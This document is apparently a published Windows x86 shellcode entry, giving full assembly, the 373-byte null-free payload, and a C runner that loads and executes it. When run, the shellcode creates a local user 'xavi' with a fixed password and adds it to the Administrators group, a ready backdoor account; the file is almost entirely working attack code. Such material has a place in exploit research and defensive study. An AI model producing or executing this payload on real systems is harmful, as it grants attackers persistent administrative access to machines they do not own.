; Title: Name: Windows/x86 - Create Administrator User / Dynamic PEB & EDT method null-free Shellcode (373 bytes)
; Author: Xavi Beltran
; Contact: xavibeltran@protonmail.com
; Website: https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/
; Date: 18/01/2022
; Tested on: Microsoft Windows Version 10.0.19045

; Description:
; This is a shellcode that creates a new user named "xavi" with password "Summer12345!". Then adds this user to administrators group.
; In order to accomplish this task the shellcode uses the PEB method to locate the baseAddress of the modules and then Export Directory Table to locate the symbols.
; The shellcodes perform 3 different calls:
; - NetUserAdd
; - NetLocalGroupAddMembers
; - ExitProcess

####################################### adduser.asm  #######################################

start:
    mov ebp, esp                   ;
    add esp, 0xfffff9f0            ; To avoid null bytes

find_kernel32:
    xor ecx, ecx                   ; ECX = 0
    mov esi,fs:[ecx+30h]           ; ESI = &(PEB) ([FS:0x30])
    mov esi,[esi+0Ch]              ; ESI = PEB->Ldr
    mov esi,[esi+1Ch]              ; ESI = PEB->Ldr.InInitOrder

next_module:
    mov ebx, [esi+8h]              ; EBX = InInitOrder[X].base_address
    mov edi, [esi+20h]             ; EDI = InInitOrder[X].module_name
    mov esi, [esi]                 ; ESI = InInitOrder[X].flink (next)
    cmp [edi+12*2], cx             ; (unicode) modulename[12] == 0x00?
    jne next_module                ; No: try next module.

find_function_shorten:
    jmp find_function_shorten_bnc  ; Short jump

find_function_ret:
    pop esi                        ; POP the return address from the stack
    mov [ebp+0x04], esi            ; Save find_function address for later usage
    jmp resolve_symbols_kernel32   ;

find_function_shorten_bnc:         ;
    call find_function_ret         ; Relative CALL with negative offset

find_function:
    pushad                         ; Save all registers
    mov eax, [ebx+0x3c]            ; Offset to PE Signature
    mov edi, [ebx+eax+0x78]        ; Export Table Directory RVA
    add edi, ebx                   ; Export Table Directory VMA
    mov ecx, [edi+0x18]            ; NumberOfNames
    mov eax, [edi+0x20]            ; AddressOfNames RVA
    add eax, ebx                   ; AddressOfNames VMA
    mov [ebp-4], eax               ; Save AddressOfNames VMA for later use


find_function_loop:
    jecxz find_function_finished   ; Jump to the end if ECX is 0
    dec ecx                        ; Decrement our names counter
    mov eax, [ebp-4]               ; Restore AddressOfNames VMA
    mov esi, [eax+ecx*4]           ; Get the RVA of the symbol name
    add esi, ebx                   ; Set ESI to the VMA of the current symbol name

compute_hash:
    xor eax, eax                   ;
    cdq                            ; Null EDX
    cld                            ; Clear direction

compute_hash_again:
    lodsb                          ; Load the next byte from esi into al
    test al, al                    ; Check for NULL terminator
    jz compute_hash_finished       ; If the ZF is set, we've hit the NULL term
    ror edx, 0x0d                  ; Rotate edx 13 bits to the right
    add edx, eax                   ; Add the new byte to the accumulator
    jmp compute_hash_again         ; Next iteration

compute_hash_finished:

find_function_compare:
    cmp edx, [esp+0x24]            ; Compare the computed hash with the requested hash
    jnz find_function_loop         ; If it doesn't match go back to find_function_loop
    mov edx, [edi+0x24]            ; AddressOfNameOrdinals RVA
    add edx, ebx                   ; AddressOfNameOrdinals VMA
    mov cx, [edx+2*ecx]            ; Extrapolate the function's ordinal
    mov edx, [edi+0x1c]            ; AddressOfFunctions RVA
    add edx, ebx                   ; AddressOfFunctions VMA
    mov eax, [edx+4*ecx]           ; Get the function RVA
    add eax, ebx                   ; Get the function VMA
    mov [esp+0x1c], eax            ; Overwrite stack version of eax from pushad

find_function_finished:
    popad                          ; Restore registers
    ret                            ;

                                   ; Resolve kernel32 symbols
resolve_symbols_kernel32:
    push 0x78b5b983                ; Kernel 32 - TerminateProcess hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x10], eax            ; Save TerminateProcess address for later usage
    push 0xec0e4e8e                ; Kernel 32 - LoadLibraryA hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x14], eax            ; Save LoadLibraryA address for later usage

                                   ; LoadLibraryA - samcli.dll
load_samcli:
    xor eax, eax                   ;
    push eax                       ;
    mov ax, 0x6c6c                 ; # ll
    push eax                       ;
    push 0x642e696c                ; d.il
    push 0x636d6173                ; cmas
    push esp                       ; Push ESP to have a pointer to the string
    call dword [ebp+0x14]          ; Call LoadLibraryA

                                   ; Resolve samcli.dll symbols
resolve_symbols_samcli:
                                   ; Samcli - NetUserAdd
    mov ebx, eax                   ; Move the base address of samcli.dll to EBX
    push 0xcd7cdf5e                ; NetUserAdd hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x1C], eax            ; Save NetUserAdd address for later usage
                                   ; Samcli - NetLocalGroupAddMembers
    push 0xc30c3dd7                ; NetLocalGroupAddMembers hash
    call dword [ebp+0x04]          ; Call find_function
    mov [ebp+0x20], eax            ; Save NetLocalGroupAddMembers address for later usage

execute_shellcode:
                                    ; Useful registers
    xor eax, eax                   ; eax = 0
    xor ebx, ebx                   ;
    inc ebx                        ; ebx = 1

                                   ; Group - Administrators
    push eax                       ; string delimiter
                                   ; push 0x00730072 ; sr
    mov edx, 0xff8cff8e            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x006f0074 ; ot
    mov edx, 0xff90ff8c            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00610072 ; ar
    mov edx, 0xff9eff8e            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00740073 ; ts
    mov edx, 0xff8bff8d            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x0069006e ; in
    mov edx, 0xff96ff92            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x0069006d ; im
    mov edx, 0xff96ff93            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00640041 ; dA
    mov edx, 0xff9bffbf            ;
    neg edx                        ;
    push edx                       ;

    mov [ebp+0x24], esp            ; store groupname in [esi]

                                   ; Username - xavi
    push eax                       ; string delimiter
                                   ; push 0x00690076 ; iv
    mov edx, 0xff96ff8a            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00610078 ; xa
    mov edx, 0xff9eff88            ;
    neg edx                        ;
    push edx                       ;

    mov ecx, esp                   ; Pointer to the string
    mov [ebp+0x28], ecx            ; store username in [esi+4]

                                   ; Password - Summer12345!
    push eax                       ; string delimiter
                                   ; push 0x00210035 ; !5
    mov edx, 0xffdeffcb            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00340033 ; 43
    mov edx, 0xffcbffcd            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00320031 ; 21
    mov edx, 0xffcdffcf            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00720065 ; re
    mov edx, 0xff8dff9b            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x006d006d ; mm
    mov edx, 0xff92ff93            ;
    neg edx                        ;
    push edx                       ;
                                   ; push 0x00750053 ; uS
    mov edx, 0xff8affad            ;
    neg edx                        ;
    push edx                       ;

    mov edx, esp                   ; store password in edx

                                   ; USER_INFO_1 structure
    push eax                       ; 0 - sScript_Path
    push ebx                       ; 1 - uiFlags
    push eax                       ; 0 - sComment
    push eax                       ; 0 - sHome_Dir
    push ebx                       ; 1 - uiPriv = USER_PRIV_USER = 1
    push eax                       ; 0 - uiPasswordAge
    push edx                       ; str - sPassword
    push ecx                       ; str - sUsername
    mov ecx, esp                   ;

                                   ; NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, UInt32 level, IntPtr userInfo, out UInt32 parm_err);
                                   ; NetUserAdd(null, 1, bufptr, out parm_err);
    push eax                       ; 0 - parm_err
    push esp                       ; pointer to USER_INFO_1 structure ?
    push ecx                       ; USER_INFO_1 - UserInfo
    push ebx                       ; 1 - level
    push eax                       ; 0 - servername

    call dword [ebp+0x1C]          ; NetUserAdd - System Call

                                   ; LOCALGROUP_MEMBERS_INFO_3 structure
    mov ecx, [ebp+0x28]            ; Domain = Username
    push ecx                       ;
    mov ecx, esp                   ; Save a pointer to Username

                                   ; NetLocalGroupAddMembers(string servername, string groupname, UInt32 level, ref LOCALGROUP_MEMBERS_INFO_3 buf, UInt32 totalentries);
                                   ; NetLocalGroupAddMembers(null, "administrators", 3, ref group, 1);
    push ebx                       ; 1 - totalentries
    push ecx                       ; LOCALGROUP_MEMBERS_INFO_3 - username
    push 3                         ; 3 - level 3 means that we are using the structure LOCALGROUP_MEMBERS_INFO_3
    push dword [ebp+0x24]          ; str - groupname
    push eax                       ; 0 - servername

    call dword [ebp+0x20]          ; NetLocalGroupAddMembers - System Call

    xor eax, eax                   ;
    push eax                       ; return 0

    call dword [ebp+0x10]          ; ExitProcess - System Call


####################################### shellcode.c  #######################################

/*

 Shellcode runner author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[] =
    "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c"
    "\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04"
    "\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18"
    "\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31"
    "\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
    "\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8"
    "\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e"
    "\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x50\x66\xb8\x6c\x6c\x50\x68\x6c\x69\x2e"
    "\x64\x68\x73\x61\x6d\x63\x54\xff\x55\x14\x89\xc3\x68\x5e\xdf\x7c\xcd\xff\x55\x04"
    "\x89\x45\x1c\x68\xd7\x3d\x0c\xc3\xff\x55\x04\x89\x45\x20\x31\xc0\x31\xdb\x43\x50"
    "\xba\x8e\xff\x8c\xff\xf7\xda\x52\xba\x8c\xff\x90\xff\xf7\xda\x52\xba\x8e\xff\x9e"
    "\xff\xf7\xda\x52\xba\x8d\xff\x8b\xff\xf7\xda\x52\xba\x92\xff\x96\xff\xf7\xda\x52"
    "\xba\x93\xff\x96\xff\xf7\xda\x52\xba\xbf\xff\x9b\xff\xf7\xda\x52\x89\x65\x24\x50"
    "\xba\x8a\xff\x96\xff\xf7\xda\x52\xba\x88\xff\x9e\xff\xf7\xda\x52\x89\xe1\x89\x4d"
    "\x28\x50\xba\xcb\xff\xde\xff\xf7\xda\x52\xba\xcd\xff\xcb\xff\xf7\xda\x52\xba\xcf"
    "\xff\xcd\xff\xf7\xda\x52\xba\x9b\xff\x8d\xff\xf7\xda\x52\xba\x93\xff\x92\xff\xf7"
    "\xda\x52\xba\xad\xff\x8a\xff\xf7\xda\x52\x89\xe2\x50\x53\x50\x50\x53\x50\x52\x51"
    "\x89\xe1\x50\x54\x51\x53\x50\xff\x55\x1c\x8b\x4d\x28\x51\x89\xe1\x53\x51\x6a\x03"
    "\xff\x75\x24\x50\xff\x55\x20\x31\xc0\x50\xff\x55\x10";

unsigned int payload_len = 373;

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("Shellcode Length:  %d\n", strlen(payload));

    if ( rv != 0 ) {
    	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    	WaitForSingleObject(th, -1);

    }

    return 0;
}